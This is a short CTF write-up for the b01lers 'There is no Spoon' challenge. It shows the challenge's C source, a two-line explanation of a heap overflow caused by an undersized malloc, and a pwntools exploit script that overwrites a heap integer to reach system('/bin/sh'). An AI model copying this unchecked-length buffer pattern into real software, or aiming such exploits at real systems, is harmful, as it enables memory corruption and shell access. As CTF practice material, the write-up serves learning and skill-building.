### There is no Spoon (100 Points)

> Neo: bend reality, and understand the truth of the matrix.
>
> [attachment](thereisnospoon-3b08fb627c71c8c2149d1e57d98a1934)

the buffer2 size can be controlled and the argument of xor function is the return value of read.  so we can use "\x00" to make the var len bigger and buffer smaller. when the program call xor function, the  changeme will be changed 🤣

```c 
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>

char * xor(char * src, char * dest, int len) {
    for(int i = 0; i < len - 1; i++) {
        dest[i] = src[i] ^ dest[i];
    }
    dest[len-1] = 0;
    return dest;
}

int main() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);

    char buffer[256];
    int len = 256;

    printf("Neo, enter your matrix: ");
    len = read(0, buffer, len); // len 

    char * buffer2 = malloc(strlen(buffer));

    int * changeme = malloc(sizeof(int));
    *changeme = 255;
    printf("Reality: %d\n", *changeme);
    
    printf("Make your choice: ");
    len = read(0, buffer2, len);

    printf("Now bend reality. Remember: there is no spoon.\n");
    char * result = xor(buffer2, buffer, len);
    printf("Result: %s\n", result);
    printf("Reality: %d\n", *changeme);

    if (*changeme != 0xff) {
        system("/bin/sh");
    }
}
```

#### exploit script

```python
from pwn import *

p = process('./thereisnospoon-3b08fb627c71c8c2149d1e57d98a1934')
# p = remote('chal.ctf.b01lers.com',1006)
p.recvuntil('matrix:')

payload ='A'*8+'\x00'*0x20
# gdb.attach(p)
p.send(payload)

p.recvuntil('choice: ')

payload = 'B'*0x18
payload += p64(0x21) # chunk size
payload += p8(0x41)  # changeme
p.send(payload)

p.interactive()
```

